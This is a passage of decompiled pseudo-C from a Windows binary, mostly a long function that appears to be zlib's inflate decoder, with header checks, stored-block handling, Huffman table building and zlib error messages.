  *(a1 + 76) = "`\a";
  *(a1 + 84) = 9;
  *(a1 + 80) = &byte_681FDAD0;
  *(a1 + 88) = 5;
  return result;
}
// 681FDAD0: using guessed type char byte_681FDAD0;

//----- (681FA5CC) --------------------------------------------------------
signed int __userpurge SomeCompressionFunct@<eax>(__m64 a1@<mm0>, __m64 a2@<mm1>, int a3, int a4)
{
  int v4; // ebx
  unsigned int v5; // edx
  unsigned int v6; // edi
  unsigned int v7; // ecx
  int v8; // eax
  int v9; // esi
  unsigned __int8 *v10; // eax
  int v11; // eax
  int v12; // eax
  unsigned int v13; // eax
  int v14; // eax
  bool v15; // zf
  unsigned int v16; // ecx
  unsigned int v17; // eax
  char v18; // dl
  unsigned __int8 *v19; // eax
  int v20; // eax
  int v21; // eax
  _DWORD *v22; // ecx
  unsigned __int8 *v23; // eax
  int v24; // eax
  int v25; // eax
  int v26; // eax
  unsigned __int8 *v27; // eax
  int v28; // eax
  int v29; // eax
  int v30; // ecx
  unsigned __int8 *v31; // eax
  int v32; // eax
  int v33; // eax
  int v34; // eax
  int v35; // eax
  unsigned int v36; // ecx
  _DWORD *v37; // edx
  int v38; // eax
  unsigned int v39; // edx
  size_t v40; // edx
  unsigned int v41; // esi
  unsigned int v42; // eax
  unsigned __int8 *v43; // edx
  int v44; // ecx
  int v45; // ecx
  unsigned int v46; // edx
  int v47; // eax
  unsigned int v48; // esi
  unsigned int v49; // eax
  unsigned __int8 *v50; // edx
  int v51; // ecx
  int v52; // ecx
  unsigned int v53; // edx
  int v54; // eax
  unsigned __int8 *v55; // eax
  int v56; // eax
  int v57; // eax
  int v58; // ecx
  unsigned int v59; // eax
  signed int result; // eax
  unsigned __int8 *v61; // eax
  int v62; // eax
  int v63; // eax
  int v64; // eax
  unsigned int v65; // eax
  int v66; // ecx
  unsigned __int8 *v67; // eax
  int v68; // eax
  int v69; // eax
  char v70; // al
  unsigned int v71; // edx
  int v72; // ecx
  unsigned __int8 *v73; // eax
  int v74; // eax
  int v75; // eax
  size_t v76; // eax
  unsigned __int8 *v77; // eax
  int v78; // eax
  int v79; // eax
  int v80; // eax
  unsigned int v81; // edx
  int v82; // eax
  int v83; // eax
  bool v84; // cf
  unsigned __int8 *v85; // eax
  int v86; // eax
  int v87; // eax
  int v88; // eax
  __int16 v89; // cx
  int v90; // edx
  int v91; // eax
  int v92; // edx
  int v93; // ecx
  unsigned int v94; // edx
  int v95; // ecx
  unsigned int v96; // edx
  unsigned int v97; // ecx
  unsigned int v98; // edx
  char v99; // cl
  int v100; // eax
  unsigned int v101; // edx
  char v102; // cl
  unsigned int v103; // eax
  int v104; // eax
  unsigned int v105; // ST08_4
  int v106; // eax
  int v107; // ecx
  unsigned int j; // eax
  char v109; // cl
  int v110; // eax
  int v111; // ecx
  int v112; // eax
  unsigned int v113; // ebx
  __int16 v114; // dx
  int v115; // ecx
  int v116; // ecx
  unsigned int v117; // esi
  unsigned __int8 *v118; // eax
  int v119; // eax
  int v120; // eax
  int v121; // eax
  unsigned int v122; // eax
  unsigned int v123; // esi
  char v124; // cl
  int v125; // eax
  int v126; // ecx
  int v127; // eax
  unsigned int v128; // ebx
  __int16 v129; // dx
  int v130; // ecx
  int v131; // ecx
  unsigned int v132; // ecx
  unsigned __int8 *v133; // eax
  int v134; // eax
  int v135; // eax
  int v136; // eax
  unsigned int v137; // ecx
  unsigned int v138; // ecx
  int v139; // eax
  int v140; // eax
  unsigned int v141; // eax
  char *v142; // ebx
  char *v143; // esi
  unsigned __int8 *v144; // eax
  int v145; // eax
  int v146; // eax
  int v147; // eax
  int v148; // ecx
  unsigned int v149; // eax
  int v150; // ecx
  unsigned __int8 *v151; // eax
  int v152; // eax
  int v153; // eax
  signed int v154; // eax
  void *v155; // eax
  signed int v156; // edx
  unsigned int v157; // eax
  int v158; // eax
  int v159; // edi
  unsigned int v160; // eax
  signed int v161; // eax
  unsigned int v162; // [esp-Ch] [ebp-50h]
  unsigned int v163; // [esp-Ch] [ebp-50h]
  char *v164; // [esp-8h] [ebp-4Ch]
  _BYTE *v165; // [esp-8h] [ebp-4Ch]
  unsigned int v167; // [esp+Ch] [ebp-38h]
  int v168; // [esp+Ch] [ebp-38h]
  unsigned int v169; // [esp+10h] [ebp-34h]
  unsigned int v170; // [esp+10h] [ebp-34h]
  size_t v171; // [esp+10h] [ebp-34h]
  int v172; // [esp+10h] [ebp-34h]
  unsigned int i; // [esp+10h] [ebp-34h]
  __int16 v174; // [esp+10h] [ebp-34h]
  int v175; // [esp+10h] [ebp-34h]
  unsigned __int16 v176; // [esp+12h] [ebp-32h]
  unsigned __int16 v177; // [esp+12h] [ebp-32h]
  unsigned int v178; // [esp+14h] [ebp-30h]
  int v179; // [esp+14h] [ebp-30h]
  int v180; // [esp+14h] [ebp-30h]
  int v181; // [esp+18h] [ebp-2Ch]
  int v182; // [esp+18h] [ebp-2Ch]
  int v183; // [esp+18h] [ebp-2Ch]
  unsigned int v184; // [esp+18h] [ebp-2Ch]
  int v185; // [esp+1Ch] [ebp-28h]
  _DWORD *v186; // [esp+20h] [ebp-24h]
  signed int v187; // [esp+24h] [ebp-20h]
  char *Dst; // [esp+28h] [ebp-1Ch]
  size_t Size; // [esp+2Ch] [ebp-18h]
  __int16 v190; // [esp+30h] [ebp-14h]
  char v191; // [esp+32h] [ebp-12h]
  char v192; // [esp+33h] [ebp-11h]
  unsigned int v193; // [esp+34h] [ebp-10h]
  unsigned int v194; // [esp+38h] [ebp-Ch]
  void *Src; // [esp+3Ch] [ebp-8h]
  unsigned int v196; // [esp+40h] [ebp-4h]

  if ( !a3 )
    return -2;
  v4 = *(a3 + 28);
  v186 = v4;
  if ( !v4 || !*(a3 + 12) || !*a3 && *(a3 + 4) )
    return -2;
  if ( *v4 == 11 )
    *v4 = 12;
  v5 = *(v4 + 56);
  v6 = *(v4 + 60);
  Dst = *(a3 + 12);
  Size = *(a3 + 16);
  Src = *a3;
  v7 = *(a3 + 4);
  v187 = 0;
  v8 = *v4;
  v196 = v7;
  v194 = v5;
  v193 = v6;
  v167 = v7;
  v185 = Size;
  v9 = a3;
  while ( 2 )
  {
    switch ( v8 )
    {
      case 0:
        if ( !*(v4 + 8) )
        {
          *v4 = 12;
          goto LABEL_140;
        }
        if ( v6 < 0x10 )
        {
          v10 = Src;
          while ( v7 )
          {
            v11 = *v10;
            v196 = v7 - 1;
            v12 = v11 << v6;
            v6 += 8;
            --v7;
            v5 += v12;
            v10 = Src + 1;
            v194 = v5;
            Src = Src + 1;
            v193 = v6;
            if ( v6 >= 0x10 )
              goto LABEL_16;
          }
          goto LABEL_343;
        }
LABEL_16:
        if ( *(v4 + 8) & 2 && v5 == 35615 )
        {
          v6 = 0;
          *(v4 + 24) = sub_681FBF51(0, 0, 0);
          v190 = -29921;
          v13 = sub_681FBF51(*(v4 + 24), &v190, 2);
          v5 = 0;
          *(v4 + 24) = v13;
          v194 = 0;
          v193 = 0;
          *v4 = 1;
          goto LABEL_139;
        }
        *(v4 + 16) = 0;
        v14 = *(v4 + 32);
        if ( v14 )
          *(v14 + 48) = -1;
        if ( !(*(v4 + 8) & 1) || (v15 = ((v5 << 8) + (v5 >> 8)) % 0x1F == 0, v5 = v194, !v15) )
        {
          *(v9 + 24) = "incorrect header check";
          goto LABEL_25;
        }
        if ( (v194 & 0xF) != 8 )
        {
          *(v9 + 24) = "unknown compression method";
LABEL_25:
          *v4 = 29;
          goto LABEL_139;
        }
        v5 = v194 >> 4;
        v6 -= 4;
        v194 = v5;
        v193 = v6;
        v16 = (v5 & 0xF) + 8;
        if ( *(v4 + 36) )
        {
          if ( v16 > *(v4 + 36) )
          {
            *(v9 + 24) = "invalid window size";
            goto LABEL_25;
          }
        }
        else
        {
          *(v4 + 36) = v16;
        }
        v6 = 0;
        *(v4 + 20) = 1 << v16;
        v17 = sub_681FBD21(0, 0, 0);
        v18 = ~BYTE1(v194);
        *(v4 + 24) = v17;
        *(v9 + 48) = v17;
        *v4 = v18 & 2 | 9;
        v5 = 0;
LABEL_29:
        v194 = v5;
        v193 = v6;
        goto LABEL_139;
      case 1:
        if ( v6 >= 0x10 )
          goto LABEL_37;
        v19 = Src;
        do
        {
          if ( !v7 )
            goto LABEL_343;
          v20 = *v19;
          v196 = v7 - 1;
          v21 = v20 << v6;
          v6 += 8;
          --v7;
          v5 += v21;
          v19 = Src + 1;
          v194 = v5;
          Src = Src + 1;
          v193 = v6;
        }
        while ( v6 < 0x10 );
LABEL_37:
        *(v4 + 16) = v5;
        if ( v5 == 8 )
        {
          if ( !(v5 & 0xE000) )
          {
            v22 = *(v4 + 32);
            if ( v22 )
              *v22 = 0;
            if ( *(v4 + 16) & 0x200 )
            {
              v190 = v5;
              *(v4 + 24) = sub_681FBF51(*(v4 + 24), &v190, 2);
            }
            v7 = v196;
            v5 = 0;
            *v4 = 2;
            v194 = 0;
            v6 = 0;
LABEL_47:
            if ( v6 < 0x20 )
            {
              v23 = Src;
              while ( v7 )
              {
                v24 = *v23;
                v196 = v7 - 1;
                v25 = v24 << v6;
                v6 += 8;
                --v7;
                v5 += v25;
                v23 = Src + 1;
                v194 = v5;
                Src = Src + 1;
                if ( v6 >= 0x20 )
                  goto LABEL_51;
              }
              goto LABEL_343;
            }
LABEL_51:
            v26 = *(v4 + 32);
            if ( v26 )
              *(v26 + 4) = v5;
            if ( *(v4 + 16) & 0x200 )
            {
              v190 = v5;
              v191 = BYTE2(v5);
              v192 = HIBYTE(v5);
              *(v4 + 24) = sub_681FBF51(*(v4 + 24), &v190, 4);
            }
            v7 = v196;
            v5 = 0;
            *v4 = 3;
            v194 = 0;
            v6 = 0;
LABEL_56:
            if ( v6 < 0x10 )
            {
              v27 = Src;
              while ( v7 )
              {
                v28 = *v27;
                v196 = v7 - 1;
                v29 = v28 << v6;
                v6 += 8;
                --v7;
                v5 += v29;
                v27 = Src + 1;
                v194 = v5;
                Src = Src + 1;
                if ( v6 >= 0x10 )
                  goto LABEL_60;
              }
              goto LABEL_343;
            }
LABEL_60:
            v30 = *(v4 + 32);
            if ( v30 )
            {
              *(v30 + 8) = v5;
              *(*(v4 + 32) + 12) = v5 >> 8;
            }
            if ( *(v4 + 16) & 0x200 )
            {
              v190 = v5;
              *(v4 + 24) = sub_681FBF51(*(v4 + 24), &v190, 2);
            }
            v7 = v196;
            v5 = 0;
            *v4 = 4;
            v6 = 0;
            v194 = 0;
            v193 = 0;
LABEL_65:
            if ( *(v4 + 16) & 0x400 )
            {
              if ( v6 < 0x10 )
              {
                v31 = Src;
                while ( v7 )
                {
                  v32 = *v31;
                  v196 = v7 - 1;
                  v33 = v32 << v6;
                  v6 += 8;
                  --v7;
                  v5 += v33;
                  v31 = Src + 1;
                  v194 = v5;
                  Src = Src + 1;
                  if ( v6 >= 0x10 )
                    goto LABEL_70;
                }
                goto LABEL_343;
              }
LABEL_70:
              v34 = *(v4 + 32);
              *(v4 + 64) = v5;
              if ( v34 )
                *(v34 + 20) = v5;
              if ( *(v4 + 16) & 0x200 )
              {
                v190 = v5;
                *(v4 + 24) = sub_681FBF51(*(v4 + 24), &v190, 2);
              }
              v6 = 0;
              v194 = 0;
              v193 = 0;
            }
            else
            {
              v35 = *(v4 + 32);
              if ( v35 )
                *(v35 + 16) = 0;
            }
            *v4 = 5;
LABEL_78:
            if ( *(v4 + 16) & 0x400 )
            {
              v36 = *(v4 + 64);
              if ( v36 > v196 )
                v36 = v196;
              v178 = v36;
              if ( v36 )
              {
                v37 = *(v4 + 32);
                if ( v37 )
                {
                  v181 = v37[4];
                  if ( v181 )
                  {
                    v38 = v37[5] - *(v4 + 64);
                    v39 = v37[6];
                    if ( v36 + v38 <= v39 )
                      v40 = v36;
                    else
                      v40 = v39 - v38;
                    memcpy((v181 + v38), Src, v40);
                    v36 = v178;
                  }
                }
                if ( *(v4 + 16) & 0x200 )
                  *(v4 + 24) = sub_681FBF51(*(v4 + 24), Src, v36);
                v196 -= v178;
                Src = Src + v178;
                *(v4 + 64) -= v178;
              }
              if ( *(v4 + 64) )
                goto LABEL_343;
            }
            v7 = v196;
            *(v4 + 64) = 0;
            *v4 = 6;
LABEL_93:
            if ( *(v4 + 16) & 0x800 )
            {
              if ( !v7 )
                goto LABEL_343;
              v41 = v196;
              v42 = 0;
              v43 = Src;
              do
              {
                v44 = v43[v42++];
                v182 = v44;
                v45 = *(v4 + 32);
                v169 = v42;
                if ( v45 )
                {
                  if ( *(v45 + 28) )
                  {
                    v46 = *(v4 + 64);
                    if ( v46 < *(v45 + 32) )
                    {
                      *(*(v45 + 28) + v46) = v182;
                      ++*(v4 + 64);
                    }
                  }
                  v43 = Src;
                }
              }
              while ( v182 && v42 < v41 );
              v9 = a3;
              if ( *(v4 + 16) & 0x200 )
              {
                *(v4 + 24) = sub_681FBF51(*(v4 + 24), v43, v42);
                v42 = v169;
              }
              Src = Src + v42;
              v7 = v196 - v42;
              v196 -= v42;
              if ( v182 )
                goto LABEL_343;
            }
            else
            {
              v47 = *(v4 + 32);
              if ( v47 )
                *(v47 + 28) = 0;
            }
            *v4 = 7;
            *(v4 + 64) = 0;
LABEL_110:
            if ( *(v4 + 16) & 0x1000 )
            {
              if ( !v7 )
                goto LABEL_343;
              v48 = v196;
              v49 = 0;
              v50 = Src;
              do
              {
                v51 = v50[v49++];
                v183 = v51;
                v52 = *(v4 + 32);
                v170 = v49;
                if ( v52 )
                {
                  if ( *(v52 + 36) )
                  {
                    v53 = *(v4 + 64);
                    if ( v53 < *(v52 + 40) )
                    {
                      *(*(v52 + 36) + v53) = v183;
                      ++*(v4 + 64);
                    }
                  }
                  v50 = Src;
                }
              }
              while ( v183 && v49 < v48 );
              v9 = a3;
              if ( *(v4 + 16) & 0x200 )
              {
                *(v4 + 24) = sub_681FBF51(*(v4 + 24), v50, v49);
                v49 = v170;
              }
              Src = Src + v49;
              v7 = v196 - v49;
              v196 -= v49;
              if ( v183 )
                goto LABEL_343;
            }
            else
            {
              v54 = *(v4 + 32);
              if ( v54 )
                *(v54 + 36) = 0;
            }
            v5 = v194;
            *v4 = 8;
LABEL_127:
            if ( *(v4 + 16) & 0x200 )
            {
              if ( v6 < 0x10 )
              {
                v55 = Src;
                while ( v7 )
                {
                  v56 = *v55;
                  v196 = v7 - 1;
                  v57 = v56 << v6;
                  v6 += 8;
                  --v7;
                  v5 += v57;
                  v55 = Src + 1;
                  v194 = v5;
                  Src = Src + 1;
                  v193 = v6;
                  if ( v6 >= 0x10 )
                    goto LABEL_132;
                }
                goto LABEL_343;
              }
LABEL_132:
              if ( v5 != *(v4 + 24) )
              {
                *(v9 + 24) = "header crc mismatch";
                goto LABEL_25;
              }
              v6 = 0;
              v194 = 0;
              v193 = 0;
            }
            v58 = *(v4 + 32);
            if ( v58 )
            {
              *(v58 + 44) = (*(v4 + 16) >> 9) & 1;
              *(*(v4 + 32) + 48) = 1;
            }
            v59 = sub_681FBF51(0, 0, 0);
            *(v4 + 24) = v59;
            *(v9 + 48) = v59;
            *v4 = 11;
            goto LABEL_138;
          }
          *(v9 + 24) = "unknown header flags set";
        }
        else
        {
          *(v9 + 24) = "unknown compression method";
        }
LABEL_39:
        *v4 = 29;
        goto LABEL_140;
      case 2:
        goto LABEL_47;
      case 3:
        goto LABEL_56;
      case 4:
        goto LABEL_65;
      case 5:
        goto LABEL_78;
      case 6:
        goto LABEL_93;
      case 7:
        goto LABEL_110;
      case 8:
        goto LABEL_127;
      case 9:
        if ( v6 >= 0x20 )
          goto LABEL_148;
        v61 = Src;
        do
        {
          if ( !v7 )
            goto LABEL_343;
          v62 = *v61;
          v196 = v7 - 1;
          v63 = v62 << v6;
          v6 += 8;
          --v7;
          v5 += v63;
          v61 = Src + 1;
          v194 = v5;
          Src = Src + 1;
        }
        while ( v6 < 0x20 );
LABEL_148:
        v7 = v196;
        v64 = (v5 >> 24) + (((v5 << 16) + (v5 & 0xFF00)) << 8) + ((v5 >> 8) & 0xFF00);
        *(v4 + 24) = v64;
        *(v9 + 48) = v64;
        v5 = 0;
        *v4 = 10;
        v194 = 0;
        v6 = 0;
LABEL_149:
        if ( !*(v4 + 12) )
        {
          *(v9 + 12) = Dst;
          *(v9 + 16) = Size;
          *v9 = Src;
          *(v9 + 4) = v7;
          *(v4 + 56) = v5;
          *(v4 + 60) = v6;
          return 2;
        }
        v65 = sub_681FBD21(0, 0, 0);
        v5 = v194;
        v7 = v196;
        *(v4 + 24) = v65;
        *(v9 + 48) = v65;
        *v4 = 11;
LABEL_151:
        if ( a4 == 5 || a4 == 6 )
          goto LABEL_343;
LABEL_153:
        if ( *(v4 + 4) )
        {
          *v4 = 26;
          v66 = v6 & 7;
          v5 >>= v66;
          v6 -= v66;
          v194 = v5;
          v193 = v6;
          goto LABEL_139;
        }
        if ( v6 < 3 )
        {
          v67 = Src;
          while ( v7 )
          {
            v68 = *v67;
            v196 = v7 - 1;
            v69 = v68 << v6;
            v6 += 8;
            --v7;
            v5 += v69;
            v67 = Src + 1;
            v194 = v5;
            Src = Src + 1;
            if ( v6 >= 3 )
              goto LABEL_159;
          }
          goto LABEL_343;
        }
LABEL_159:
        v70 = v5;
        v71 = v5 >> 1;
        *(v4 + 4) = v70 & 1;
        if ( v71 & 3 )
        {
          switch ( v71 & 3 )
          {
            case 1u:
              InsertCharsIntoBuffer(v4);
              *v4 = 19;
              if ( a4 == 6 )
              {
                v6 -= 3;
                v194 = v71 >> 2;
                goto LABEL_343;
              }
              break;
            case 2u:
              *v4 = 16;
              break;
            case 3u:
              *(v9 + 24) = "invalid block type";
              *v4 = 29;
              break;
          }
        }
        else
        {
          *v4 = 13;
        }
        v5 = v71 >> 2;
        v6 -= 3;
        goto LABEL_29;
      case 10:
        goto LABEL_149;
      case 11:
        goto LABEL_151;
      case 12:
        goto LABEL_153;
      case 13:
        v72 = v6 & 7;
        v6 -= v72;
        v5 >>= v72;
        v194 = v5;
        v193 = v6;
        if ( v6 >= 0x20 )
          goto LABEL_173;
        v73 = Src;
        do
        {
          v7 = v196;
          if ( !v196 )
            goto LABEL_344;
          v74 = *v73;
          --v196;
          v75 = v74 << v6;
          v6 += 8;
          v5 += v75;
          v193 = v6;
          v73 = Src + 1;
          v194 = v5;
          Src = Src + 1;
        }
        while ( v6 < 0x20 );
LABEL_173:
        if ( v5 == ~v5 >> 16 )
        {
          *(v4 + 64) = v5;
          v5 = 0;
          v7 = v196;
          v6 = 0;
          v194 = 0;
          v193 = 0;
          *v4 = 14;
          if ( a4 != 6 )
          {
LABEL_176:
            *v4 = 15;
LABEL_177:
            v76 = *(v4 + 64);
            if ( !v76 )
            {
              *v4 = 11;
              goto LABEL_140;
            }
            if ( v76 > v7 )
              v76 = v7;
            if ( v76 > Size )
              v76 = Size;
            v171 = v76;
            if ( v76 )
            {
              memcpy(Dst, Src, v76);
              Src = Src + v171;
              v7 = v196 - v171;
              Size -= v171;
              Dst += v171;
              *(v4 + 64) -= v171;
              v5 = v194;
              v196 = v7;
              goto LABEL_140;
            }
            goto LABEL_343;
          }
          goto LABEL_344;
        }
        *(v9 + 24) = "invalid stored block lengths";
        goto LABEL_25;
      case 14:
        goto LABEL_176;
      case 15:
        goto LABEL_177;
      case 16:
        if ( v6 >= 0xE )
          goto LABEL_189;
        v77 = Src;
        do
        {
          if ( !v7 )
            goto LABEL_343;
          v78 = *v77;
          v196 = v7 - 1;
          v79 = v78 << v6;
          v6 += 8;
          --v7;
          v5 += v79;
          v77 = Src + 1;
          v194 = v5;
          Src = Src + 1;
        }
        while ( v6 < 0xE );
LABEL_189:
        v6 -= 14;
        v80 = v5 & 0x1F;
        v81 = v5 >> 5;
        v193 = v6;
        *(v4 + 96) = v80 + 257;
        v82 = v81 & 0x1F;
        v81 >>= 5;
        *(v4 + 100) = v82 + 1;
        v83 = v81 & 0xF;
        v5 = v81 >> 4;
        v194 = v5;
        v84 = *(v4 + 96) < 0x11Eu;
        v15 = *(v4 + 96) == 286;
        *(v4 + 92) = v83 + 4;
        if ( !v84 && !v15 || *(v4 + 100) > 0x1Eu )
        {
          *(v9 + 24) = "too many length or distance symbols";
          goto LABEL_39;
        }
        *(v4 + 104) = 0;
        *v4 = 17;
LABEL_198:
        if ( *(v4 + 104) >= *(v4 + 92) )
        {
          while ( *(v4 + 104) < 0x13u )
            *(v4 + 2 * word_681FDB50[(*(v4 + 104))++] + 112) = 0;
          *(v4 + 76) = v4 + 1328;
          *(v4 + 108) = v4 + 1328;
          *(v4 + 84) = 7;
          v187 = sub_681FC244(0, v4 + 112, 0x13u, (v4 + 108), (v4 + 84), (v4 + 752));
          if ( v187 )
          {
            *(v9 + 24) = "invalid code lengths set";
            goto LABEL_204;
          }
          *(v4 + 104) = 0;
          *v4 = 18;
          while ( 1 )
          {
            while ( 1 )
            {
LABEL_232:
              v184 = *(v4 + 104);
              if ( v184 >= *(v4 + 96) + *(v4 + 100) )
                goto LABEL_236;
              while ( 1 )
              {
                v90 = v194 & ((1 << *(v4 + 84)) - 1);
                v91 = *(*(v4 + 76) + 4 * v90);
                v172 = *(*(v4 + 76) + 4 * v90);
                if ( (*(*(v4 + 76) + 4 * v90) >> 8) <= v6 )
                  break;
                v7 = v196;
                if ( !v196 )
                  goto LABEL_344;
                --v196;
                v194 += *Src << v6;
                Src = Src + 1;
                v6 += 8;
              }
              if ( HIWORD(v91) >= 0x10u )
                break;
              v6 -= BYTE1(v91);
              v194 >>= SBYTE1(v91);
              v193 = v6;
              *(v4 + 2 * v184 + 112) = HIWORD(v91);
              ++*(v4 + 104);
            }
            if ( HIWORD(v91) == 16 )
            {
              for ( i = BYTE1(v91) + 2; v6 < i; Src = Src + 1 )
              {
                v7 = v196;
                if ( !v196 )
                  goto LABEL_344;
                --v196;
                v92 = *Src << v6;
                v6 += 8;
                v194 += v92;
              }
              v6 -= BYTE1(v91);
              v5 = v194 >> SBYTE1(v91);
              v194 >>= SBYTE1(v91);
              v193 = v6;
              if ( !v184 )
              {
                *(v9 + 24) = "invalid bit length repeat";
                goto LABEL_25;
              }
              v93 = v5 & 3;
              v94 = v5 >> 2;
              v95 = v93 + 3;
              v174 = *(v4 + 2 * v184 + 110);
              v6 -= 2;
            }
            else
            {
              v96 = v194;
              v97 = BYTE1(v91);
              if ( HIWORD(v172) == 17 )
              {
                v193 = BYTE1(v91);
                while ( v6 < v97 + 3 )
                {
                  v7 = v196;
                  if ( !v196 )
                    goto LABEL_344;
                  --v196;
                  v97 = v193;
                  v96 += *Src << v6;
                  Src = Src + 1;
                  v6 += 8;
                  v194 = v96;
                }
                v98 = v96 >> v97;
                v99 = v98;
                v94 = v98 >> 3;
                v95 = (v99 & 7) + 3;
                v100 = -3 - v193;
              }
              else
              {
                v193 = BYTE1(v91);
                while ( v6 < v97 + 7 )
                {
                  v7 = v196;
                  if ( !v196 )
                    goto LABEL_344;
                  --v196;
                  v97 = v193;
                  v96 += *Src << v6;
                  Src = Src + 1;
                  v6 += 8;
                  v194 = v96;
                }
                v101 = v96 >> v97;
                v102 = v101;
                v94 = v101 >> 7;
                v95 = (v102 & 0x7F) + 11;
                v100 = -7 - v193;
              }
              v174 = 0;
              v6 += v100;
            }
            v103 = *(v4 + 96) + *(v4 + 100);
            v194 = v94;
            v193 = v6;
            if ( v184 + v95 > v103 )
              break;
            for ( ; v95; --v95 )
              *(v4 + 2 * (*(v4 + 104))++ + 112) = v174;
          }
          *(v9 + 24) = "invalid bit length repeat";
          *v4 = 29;
LABEL_236:
          if ( *v4 == 29 )
            goto LABEL_138;
          if ( !*(v4 + 624) )
          {
            *(v9 + 24) = "invalid code -- missing end-of-block";
            goto LABEL_204;
          }
          *(v4 + 76) = v4 + 1328;
          *(v4 + 108) = v4 + 1328;
          *(v4 + 84) = 9;
          v187 = sub_681FC244(1, v4 + 112, *(v4 + 96), (v4 + 108), (v4 + 84), (v4 + 752));
          if ( v187 )
          {
            *(v9 + 24) = "invalid literal/lengths set";
            goto LABEL_204;
          }
          *(v4 + 80) = *(v4 + 108);
          v104 = *(v4 + 96);
          v105 = *(v4 + 100);
          *(v4 + 88) = 6;
          v187 = sub_681FC244(2, v4 + 2 * (v104 + 56), v105, (v4 + 108), (v4 + 88), (v4 + 752));
          if ( !v187 )
          {
            v7 = v196;
            *v4 = 19;
            if ( a4 == 6 )
              goto LABEL_344;
            v5 = v194;
LABEL_245:
            *v4 = 20;
LABEL_246:
            if ( v7 >= 6 && Size >= 0x102 )
            {
              *(v9 + 12) = Dst;
              v4 = v186;
              *(v9 + 16) = Size;
              *v9 = Src;
              *(v9 + 4) = v7;
              v186[14] = v5;
              v186[15] = v6;
              sub_681FC6D0(a1, a2, v9, v185);
              v15 = *v186 == 11;
              v5 = v186[14];
              v6 = v186[15];
              Dst = *(v9 + 12);
              v7 = *(v9 + 4);
              Size = *(v9 + 16);
              Src = *v9;
              v196 = v7;
              v194 = v5;
              v193 = v6;
              if ( v15 )
                v186[1777] = -1;
              goto LABEL_140;
            }
            v106 = *(v4 + 76);
            v107 = *(v4 + 84);
            *(v4 + 7108) = 0;
            v179 = v106;
            for ( j = *(*(v4 + 76) + 4 * (v5 & ((1 << v107) - 1)));
                  BYTE1(j) > v6;
                  j = *(v112 + 4 * (v5 & ((1 << v111) - 1))) )
            {
              v7 = v196;
              if ( !v196 )
                goto LABEL_344;
              --v196;
              v109 = v6;
              v6 += 8;
              v193 = v6;
              v110 = *Src << v109;
              v111 = *(v4 + 84);
              v5 += v110;
              Src = Src + 1;
              v112 = *(v4 + 76);
              v194 = v5;
            }
            if ( j && !(j & 0xF0) )
            {
              v113 = j >> 8;
              v176 = HIWORD(j);
              v114 = j;
              j = *(v179 + 4 * ((j >> 16) + ((v194 & ((1 << (BYTE1(j) + j)) - 1)) >> SBYTE1(j))));
              v6 = v193;
              v115 = v113;
              v4 = v186;
              if ( v115 + BYTE1(j) > v193 )
              {
                while ( v196 )
                {
                  --v196;
                  v193 = v6 + 8;
                  v194 += *Src << v6;
                  Src = Src + 1;
                  j = *(v186[19] + 4 * (v176 + ((v194 & ((1 << (HIBYTE(v114) + v114)) - 1)) >> SHIBYTE(v114))));
                  v6 += 8;
                  if ( HIBYTE(v114) + BYTE1(j) <= v6 )
                    goto LABEL_259;
                }
                goto LABEL_343;
              }
LABEL_259:
              v9 = a3;
              v116 = HIBYTE(v114);
              v5 = v194 >> SHIBYTE(v114);
              v6 -= v116;
              v186[1777] = v116;
            }
            *(v4 + 7108) += BYTE1(j);
            v6 -= BYTE1(j);
            v5 >>= SBYTE1(j);
            v194 = v5;
            v193 = v6;
            *(v4 + 64) = j >> 16;
            if ( !j )
            {
              *v4 = 25;
              goto LABEL_139;
            }
            if ( j & 0x20 )
            {
              *(v4 + 7108) = -1;
              *v4 = 11;
              goto LABEL_139;
            }
            v7 = v196;
            if ( j & 0x40 )
            {
              *(v9 + 24) = "invalid literal/length code";
              goto LABEL_39;
            }
            *v4 = 21;
            *(v4 + 72) = j & 0xF;
LABEL_267:
            v117 = *(v4 + 72);
            if ( v117 )
            {
              if ( v6 < v117 )
              {
                v118 = Src;
                while ( v7 )
                {
                  v119 = *v118;
                  v196 = v7 - 1;
                  v120 = v119 << v6;
                  v6 += 8;
                  --v7;
                  v5 += v120;
                  v118 = Src + 1;
                  v194 = v5;
                  Src = Src + 1;
                  if ( v6 >= v117 )
                    goto LABEL_272;
                }
                goto LABEL_343;
              }
LABEL_272:
              v6 -= v117;
              v193 = v6;
              v121 = v5 & ((1 << v117) - 1);
              v5 >>= v117;
              *(v4 + 64) += v121;
              *(v4 + 7108) += v117;
              v194 = v5;
            }
            *(v4 + 7112) = *(v4 + 64);
            *v4 = 22;
LABEL_274:
            v180 = *(v4 + 80);
            v122 = *(v180 + 4 * (v5 & ((1 << *(v4 + 88)) - 1)));
            if ( BYTE1(v122) > v6 )
            {
              v123 = v196;
              while ( v123 )
              {
                v124 = v6;
                --v123;
                v6 += 8;
                v196 = v123;
                v193 = v6;
                v125 = *Src << v124;
                v126 = *(v4 + 88);
                v5 += v125;
                Src = Src + 1;
                v127 = *(v4 + 80);
                v194 = v5;
                v122 = *(v127 + 4 * (v5 & ((1 << v126) - 1)));
                if ( BYTE1(v122) <= v6 )
                  goto LABEL_278;
              }
              goto LABEL_343;
            }
LABEL_278:
            if ( !(v122 & 0xF0) )
            {
              v128 = v122 >> 8;
              v177 = HIWORD(v122);
              v129 = v122;
              v122 = *(v180 + 4 * ((v122 >> 16) + ((v194 & ((1 << (BYTE1(v122) + v122)) - 1)) >> SBYTE1(v122))));
              v6 = v193;
              v130 = v128;
              v4 = v186;
              if ( v130 + BYTE1(v122) > v193 )
              {
                while ( v196 )
                {
                  --v196;
                  v193 = v6 + 8;
                  v194 += *Src << v6;
                  Src = Src + 1;
                  v122 = *(v186[20] + 4 * (v177 + ((v194 & ((1 << (HIBYTE(v129) + v129)) - 1)) >> SHIBYTE(v129))));
                  v6 += 8;
                  if ( HIBYTE(v129) + BYTE1(v122) <= v6 )
                    goto LABEL_282;
                }
                goto LABEL_343;
              }
LABEL_282:
              v131 = HIBYTE(v129);
              v6 -= HIBYTE(v129);
              v5 = v194 >> SHIBYTE(v129);
              v186[1777] += v131;
            }
            v9 = a3;
            *(v4 + 7108) += BYTE1(v122);
            v6 -= BYTE1(v122);
            v5 >>= SBYTE1(v122);
            v194 = v5;
            v193 = v6;
            if ( v122 & 0x40 )
            {
              *(a3 + 24) = "invalid distance code";
              goto LABEL_25;
            }
            *v4 = 23;
            *(v4 + 68) = v122 >> 16;
            *(v4 + 72) = v122 & 0xF;
LABEL_286:
            v132 = *(v4 + 72);
            if ( v132 )
            {
              if ( v6 < v132 )
              {
                v133 = Src;
                do
                {
                  v7 = v196;
                  if ( !v196 )
                    goto LABEL_344;
                  v134 = *v133;
